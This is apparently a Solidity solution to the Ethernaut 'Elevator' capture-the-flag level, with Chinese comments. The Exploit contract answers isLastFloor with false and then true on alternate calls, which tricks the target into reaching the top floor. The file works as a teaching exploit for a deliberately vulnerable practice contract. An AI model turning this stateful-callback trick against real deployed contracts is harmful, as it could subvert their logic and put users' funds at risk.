// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../../contracts/contracts/levels/Elevator.sol';
import 'hardhat/console.sol';



contract Exploit  {
    Elevator public target;
    uint256 public count;
    uint256 public floor;
 
    //in constructor 中，合约还没有部署好，收到ether 时，
    constructor (address _target) public {
        target = Elevator(_target);
        // target.goTo(2);   //此处msg.send是EOA
    }
    
    function goTo(uint256 _floor) public{
        target.goTo(_floor);
    }

    function isLastFloor(uint _floor) public returns (bool){  //为了安全起见，可以加onlyTarget 的modifier.
        floor = _floor;

        bool isLast; 
        if (count%2 == 0){
            isLast = false;
        }else{
            isLast = true;
        }
        count ++;
        return isLast;
     }

}
